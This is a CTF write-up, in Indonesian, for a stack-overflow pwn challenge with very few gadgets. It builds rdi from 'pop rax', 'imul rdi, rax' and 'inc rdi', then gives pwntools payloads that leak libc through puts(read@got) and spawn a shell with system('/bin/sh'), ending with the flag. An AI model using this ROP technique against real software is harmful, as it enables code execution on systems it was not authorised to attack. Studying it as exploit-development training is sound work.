# A More Complicated Example

Challenge ini kelihatannya sederhana karena bug-nya cuma satu `read(0, buf, 0x80)` ke buffer stack 0x20 byte. Tapi bagian yang bikin agak nyebelin adalah gadget di binary hampir tidak ada. Tidak ada `pop rdi ; ret`, tidak ada `__libc_csu_init`, dan awalnya itu bikin ROP biasa kelihatan mentok.

## Recon

Binary:

- ELF 64-bit
- No PIE
- No Canary
- NX enabled
- Partial RELRO

Fungsi `main`:

```c
char buf[0x20];
read(0, buf, 0x80);
puts("LOOKS HUMAN MADE... SUSPICIOUS");
```

Jadi offset RIP langsung:

- `0x20` byte buffer
- `0x08` saved RBP
- total `0x28`

## Hal yang awalnya menipu

Gadget register yang paling kelihatan cuma ini:

- `pop rax ; ret`
- `inc rdi ; ret`
- `imul rdi, rax ; ret`

Sekilas problemnya adalah kita tidak punya `pop rdi ; ret`, jadi susah buat manggil `puts(read@got)` atau `system("/bin/sh")`.

Awalnya saya sempat coba pivot ke `.bss`, bikin stage loader dari potongan `main`, lalu leak dari sana. Secara lokal itu sempat jalan, tapi di remote libc-nya lebih sensitif dan jalur leak itu gampang crash karena `puts` jalan di stack pivot buatan yang terlalu rapat.

Solusi akhirnya jauh lebih bersih.

## Ide kunci

Walau kita tidak punya `pop rdi`, ternyata kita tetap bisa bikin `rdi = arbitrary` dengan gadget yang ada.

Triknya:

1. `pop rax ; ret` dengan nilai `0`
2. `imul rdi, rax ; ret`

Karena `rdi * 0 = 0`, sekarang `rdi` jadi nol.

Lalu:

1. `inc rdi ; ret` membuat `rdi = 1`
2. `pop rax ; ret` isi target
3. `imul rdi, rax ; ret`

Karena `1 * target = target`, akhirnya `rdi = target`.

Dengan itu, kita tidak perlu pivot aneh-aneh lagi. Kita bisa langsung ROP dari stack asli.

## Stage 1: leak libc

Payload pertama:

```python
payload = flat(
    b"A" * 0x28,
    pop_rax, 0,
    imul_rdi_rax,
    inc_rdi,
    pop_rax, elf.got["read"],
    imul_rdi_rax,
    elf.plt["puts"],
    elf.sym["main"],
)
```

Efeknya:

- nolkan `rdi`
- set `rdi = read@got`
- panggil `puts(read@got)`
- balik lagi ke `main`

Karena binary non-PIE dan libc challenge disediakan, setelah dapat alamat `read`, base libc tinggal:

```python
libc_base = leaked_read - libc.sym["read"]
```

## Stage 2: shell

Setelah balik ke `main`, kirim payload kedua.

Karena read di binary cuma 0x80 byte, chain tahap dua harus pendek. `execve("/bin/sh", 0, 0)` lewat gadget libc sebenarnya bisa, tapi chain-nya kepanjangan untuk budget payload yang tersedia.

Yang paling pas adalah `system("/bin/sh")`:

```python
payload = flat(
    b"A" * 0x28,
    pop_rax, 0,
    imul_rdi_rax,
    inc_rdi,
    pop_rax, libc_base + binsh,
    imul_rdi_rax,
    ret,
    libc_base + libc.sym["system"],
)
```

`ret` dipakai buat alignment stack sebelum masuk `system`.

Setelah itu tinggal kirim command dari shell:

```sh
cat /flag*
```

## Flag

```text
RMCTF{63771n6_4_b17_h4rd3r}
```

## Ringkasan

Inti challenge ini bukan di bug stack overflow-nya, tapi di keterbatasan gadget. Kalau terpaku mencari `pop rdi ; ret`, challenge ini terasa lebih ribet dari yang sebenarnya. Begitu sadar `imul rdi, rax` bisa dipakai untuk:

- men-zero-kan `rdi`
- lalu membentuk `rdi` arbitrary

ROP-nya langsung jadi sederhana lagi: leak libc, balik ke `main`, lalu `system("/bin/sh")`.
